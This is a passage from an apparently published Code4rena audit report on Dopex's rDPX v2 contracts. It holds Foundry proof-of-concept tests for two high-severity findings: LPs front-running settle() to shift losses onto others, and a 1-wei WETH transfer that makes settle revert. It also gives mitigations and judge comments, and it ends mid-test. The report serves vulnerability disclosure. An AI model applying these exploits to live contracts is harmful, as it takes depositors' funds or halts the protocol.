   // At this point the Core contract has purchased options to sell 100 rdpx tokens</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // The market moves against `rdpx` and the puts are now in the money</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    priceOracle.updateRdpxPrice(0.010 gwei);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // Bob, a savvy user, sees there is collateral available to withdraw, and</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // because he monitors the price he knows the vault is about to take a loss</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // thus, he withdraws his capital, expecting a call to settle.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    userBalance = vaultLp.balanceOf(address(1));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    vm.startPrank(address(1));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    vaultLp.redeem(userBalance, address(1), address(1));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    vm.stopPrank();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    vm.startPrank(address(this), address(this));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    (uint256 ethAmount, uint256 rdpxAmount) = vault.settle(tokenIds);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    vm.stopPrank();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // Bob now re-enters the LP Vault</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    vm.startPrank(address(1));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    vaultLp.deposit(weth.balanceOf(address(1)), address(1));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    vm.stopPrank();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // Now we tally up the scores</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    console.log(&quot;User Bob ends with (WETH, RDPX, Shares):&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    userBalance = vaultLp.balanceOf(address(1));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    (uint256 aBob, uint256 bBob) = vaultLp.redeemPreview(userBalance);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    console.log(aBob, bBob, userBalance);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    userBalance = vaultLp.balanceOf(address(2));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    (uint256 aDave, uint256 bDave) = vaultLp.redeemPreview(userBalance);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    console.log(&quot;User Dave ends with (WETH, RDPX, Shares):&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    console.log(aDave, bDave, userBalance);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    /** </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        Bob and Dave both started with 5 ether deposited into the vault LP.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        Bob ends up with shares worth 4.08 WETH + 16.32 RDPX</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        Dave ends up with shares worth 3.48 WETH + 13.94 RDPX</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        Thus we can conclude that by anticipating calls to `settle`, </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        either by monitoring the market or through front-running,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        Bob has forced Dave to take on more of the losses.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    */</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n</details>\n<p>The result is that even though Bob and Dave both started with 5 WETH deposited, by anticipating the call to <code>settle()</code>, Bob was able to force Dave to take more of the losses while Bob was able to reenter and gain more shares than he started with. He has twisted the knife, so to speak.</p>\n<p><em>Importantly, because the economic incentive is to exit and enter the pool in this way, it is likely to create a race condition where all the available collateral becomes withdrawn the moment the puts are in the money, meaning no user can bond (as options purchasing will revert <a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L278-L281\">due to this check</a>). This leads to temporary DoS of the bonding mechanism, until either the team takes direct action (setting <code>putsRequired</code> to <code>false</code>) or new deposits come back into the vault</em></p>\n<h3 id=\"tools-used\" style=\"position:relative;\"><a href=\"#tools-used\" aria-label=\"tools used permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>Foundry.</p>\n<h3 id=\"recommended-mitigation-steps-1\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-1\" aria-label=\"recommended mitigation steps 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>One option would be to rework the deposits to allow a “cooling off period” after deposits, meaning that assets can’t be withdrawn until a set date in the future.</p>\n<p>Another option would be to mint more shares to the vault itself in response to calls to <code>settle()</code> which accrue to users. These shares can then be distributed to the users as they redeem based on their time in the vault (in effect rewarding the hodlers).</p>\n<p>This is not a trivial change, as it will impact the token economics of the project.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1584#issuecomment-1734037608\">psytama (Dopex) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1584#issuecomment-1772839989\">Alex the Entreprenerd (Judge) commented</a>:</strong></p>\n<blockquote>\n<p>I’m understanding that LPs are able to indeed able to redeem up to <code>totalAvailableCollateral</code>.</p>\n<p>For this reason, I agree with the validity of the finding.</p>\n<p>Conflicted on severity as total loss is capped, however, am thinking High is correct because new depositors are effectively guaranteed a loss, and there seems to be no rational way to avoid this scenario.</p>\n</blockquote>\n<hr>\n<h2 id=\"h-03-the-settle-feature-will-be-broken-if-attacker-arbitrarily-transfer-collateral-tokens-to-the-perpetualatlanticvaultlp\" style=\"position:relative;\"><a href=\"#h-03-the-settle-feature-will-be-broken-if-attacker-arbitrarily-transfer-collateral-tokens-to-the-perpetualatlanticvaultlp\" aria-label=\"h 03 the settle feature will be broken if attacker arbitrarily transfer collateral tokens to the perpetualatlanticvaultlp permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1227\">[H-03] The settle feature will be broken if attacker arbitrarily transfer collateral tokens to the PerpetualAtlanticVaultLP</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1227\">klau5</a>, also found by <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/2171\">KrisApostolov</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/2089\">Toshii</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/2081\">0xc0ffEE</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/2044\">codegpt</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/2017\">clash</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1966\">ge6a</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1923\">QiuhaoLi</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1888\">parsely</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1881\">Tendency</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1817\">wintermute</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1797\">bin2chen</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1792\">Blockian</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1769\">__141345__</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1690\">Evo</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1632\">0xbranded</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1610\">visualbits</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1596\">Udsen</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1590\">0xvj</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1586\">nirlin</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1571\">ak1</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1567\">jasonxiale</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1566\">pontifex</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1549\">Aymen0909</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1517\">DanielArmstrong</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1515\">AkshaySrivastav</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1514\">savi0ur</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1469\">RED-LOTUS-REACH</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1392\">crunch</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1390\">sces60107</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1382\">pks_</a>, Mike_Bello90 (<a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1340\">1</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1256\">2</a>), <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1326\">tnquanghuy0512</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1314\">circlelooper</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1293\">ubermensch</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1261\">asui</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1201\">oakcobalt</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1197\">bart1e</a>, Anirruth (<a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1190\">1</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/518\">2</a>), <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1171\">0xklh</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1167\">blutorque</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1165\">Baki</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1152\">Snow24</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1133\">Yanchuan</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1109\">Jiamin</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1095\">SBSecurity</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1091\">kutugu</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1083\">LokiThe5th</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1076\">Juntao</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1049\">nobody2018</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1019\">juancito</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1017\">carrotsmuggler</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/981\">ladboy233</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/932\">mert_eren</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/920\">BugzyVonBuggernaut</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/892\">GangsOfBrahmin</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/873\">said</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/806\">rokinot</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/771\">ayden</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/754\">0xDING99YA</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/749\">lanrebayode77</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/742\">peakbolt</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/723\">chainsnake</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/674\">T1MOH</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/662\">Inspex</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/619\">gjaldon</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/592\">SpicyMeatball</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/582\">LFGSecurity</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/571\">ke1caM</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/542\">Norah</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/517\">auditsea</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/488\">dirk_y</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/480\">max10afternoon</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/464\">tapir</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/437\">spidy730</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/417\">HChang26</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/394\">grearlake</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/373\">0xCiphky</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/370\">chaduke</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/362\">volodya</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/343\">sl1</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/324\">0x3b</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/305\">Nyx</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/249\">kodyvim</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/228\">ravikiranweb3</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/197\">ABA</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/161\">0xWaitress</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/131\">0xsurena</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/126\">rvierdiiev</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/124\">degensec</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/119\">Kow</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/13\">Krace</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1270\">mahdikarimi</a>, and <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/2193\">sh1v</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L199-L205\">https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L199-L205</a> </p>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L359-L361\">https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVault.sol#L359-L361</a> </p>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/core/RdpxV2Core.sol#L772-L774\">https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/core/RdpxV2Core.sol#L772-L774</a></p>\n<p><code>RdpxV2Core.settle</code> reverts and the protocol stops.</p>\n<h3 id=\"proof-of-concept-2\" style=\"position:relative;\"><a href=\"#proof-of-concept-2\" aria-label=\"proof of concept 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>If a collateral token(WETH) is arbitrarily sent to PerpetualAtlanticVaultLP, the values of <code>collateral.balanceOf(address(this))</code> and <code>_totalCollateral</code> will be different.</p>\n<p>Since <code>PerpetualAtlanticVaultLP.subtractLoss</code> requires that <code>collateral.balanceOf(address(this))</code> exactly match with <code>_totalCollateral - loss</code>, <code>PerpetualAtlanticVaultLP.subtractLoss</code> will be failed if an attacker arbitrarily transfers collateral tokens to the PerpetualAtlanticVaultLP contract.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"5\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">subtractLoss</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">loss</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyPerpVault</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">collateral</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">)) == </span><span class=\"mtk12\">_totalCollateral</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">loss</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk8\">&quot;Not enough collateral was sent out&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">_totalCollateral</span><span class=\"mtk1\"> -= </span><span class=\"mtk12\">loss</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L199-L205\">https://github.com/code-423n4/2023-08-dopex/blob/eb4d4a201b3a75dd4bddc74a34e9c42c71d0d12f/contracts/perp-vault/PerpetualAtlanticVaultLP.sol#L199-L205</a></p>\n<p>Since there is no function that synchronizes <code>_totalCollateral</code> with <code>collateral.balanceOf(address(this))</code> without moving tokens, even admin cannot fix.</p>\n<p>This is exploit PoC. Add this test case at <code>tests/perp-vault/Unit.t.sol</code></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"6\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testSettlePoC</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">weth</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">), </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">weth</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">777</span><span class=\"mtk1\">), </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// give some tokens to attacker</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">deposit</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">vault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">purchase</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ids</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">ids</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk11\">skip</span><span class=\"mtk1\">(</span><span class=\"mtk7\">86500</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// expire</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">priceOracle</span><span class=\"mtk1\">.</span><span class=\"mtk11\">updateRdpxPrice</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0.010</span><span class=\"mtk1\"> </span><span class=\"mtk12\">gwei</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// ITM</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">wethBalanceBefore</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">weth</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rdpxBalanceBefore</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">rdpx</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// attack</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">777</span><span class=\"mtk1\">), </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">777</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">weth</span><span class=\"mtk1\">.</span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vaultLp</span><span class=\"mtk1\">), </span><span class=\"mtk7\">1</span><span class=\"mtk1\">); </span><span class=\"mtk3\">// send 1 wei of collateral</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">expectRevert</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Not enough collateral was sent out&quot;</span><span 